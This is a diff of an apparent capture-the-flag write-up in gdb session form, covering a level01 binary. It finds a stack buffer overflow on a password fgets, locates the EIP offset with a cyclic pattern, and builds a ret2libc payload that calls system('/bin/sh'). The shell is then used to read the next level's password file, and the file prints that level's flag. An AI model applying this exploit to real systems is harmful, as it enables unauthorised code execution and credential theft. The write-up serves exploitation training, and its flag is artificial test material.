@@ -1,45 +1,61 @@
-# The program read on stdin with `fgets` two time and compare our inputs
-# with the username 'dat_wil' and a password 'admin'
-   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
-   [...]
-   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
+gdb> disass main
+0x080484db <+11>:	lea    ebx,[esp+0x1c]
+0x080484df <+15>:	mov    eax,0x0
+0x080484e4 <+20>:	mov    edx,0x10
+0x080484e9 <+25>:	mov    edi,ebx
+0x080484eb <+27>:	mov    ecx,edx
+0x080484ed <+29>:	rep stos DWORD PTR es:[edi],eax
+[...]
+0x0804855c <+140>:	mov    eax,ds:0x804a020
+0x08048561 <+145>:	mov    DWORD PTR [esp+0x8],eax
+0x08048565 <+149>:	mov    DWORD PTR [esp+0x4],0x64
+0x0804856d <+157>:	lea    eax,[esp+0x1c]
+0x08048571 <+161>:	mov    DWORD PTR [esp],eax
+0x08048574 <+164>:	call   0x8048370 <fgets@plt>
+# Here we can see a buffer of length 16 where we try to store 100 chars
+# We can try exploit this
 
-# Let's try to use pattern to see if the program segfault
-gdb> pattern create 512
-'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMA'
-
-# We will first write 'dat_wil' + the pattern or else the program wont continue
+gdb> pattern create 128
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA'
 gdb> r
 ********* ADMIN LOGIN PROMPT *********
-Enter Username:
-> dat_wilAAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMA
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOA'
+
 SIGSEGV
 
-# Nice lets look for our pattern
 gdb> pattern search
 [...]
-EIP+0 found at offset: 328
+Registers contain pattern buffer:
+EIP+0 found at offset: 80
+[...]
+# Here we manage to overwrite the EIP at offset 80
+# We cas then use a ret2libc exploit
+
+# First we find the adress of `system` function call
+gdb> info func system
+[...]
+0xf7e6aed0  system
 [...]
 
-# Good! We manage to overwrite EIP at offset 328
+# Then we search for the string "/bin/sh"
+gdb> searchmem "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f897ec ("/bin/sh")
 
-# We will use the ret2libc exploit
-# First we need to find the addres of the `system` libc function
-gdb> info func system
-0xf7e6aed0  system
+# And we need a return address
+gdb> disass main
+[...]
+0x080485b5 <+229>:	ret
+[...]
 
-# Then we need to find the string "/bin/sh"
-gdb> info proc map
-	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
-	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
-	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
-	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
-gdb> find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
-0xf7f897ec
-1 pattern found.
-
-# We prepare our payload
-$> python -c "print 'dat_wil' + 'A'*328 + '\xcf\x84\x04\x08' + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'" > /tmp/payload_1
-$> cat /tmp/payload_1 - | ./level01
-> cat /home/users/level02/.pass
+# We need to write 255 char for the first `fgets`
+# Then we prepare the payload
+$> python -c "print 'dat_wil' + 'B' * 248 + 'A' * 80 + '\xb5\x85\x04\x08' + '\xd0\xae\xe6\xf7' + 'DUMM' + '\xec\x97\xf8\xf7'" > /tmp/pl1
+$> cat /tmp/pl1 - | ./level1
+$ cat /home/users/level02/.pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
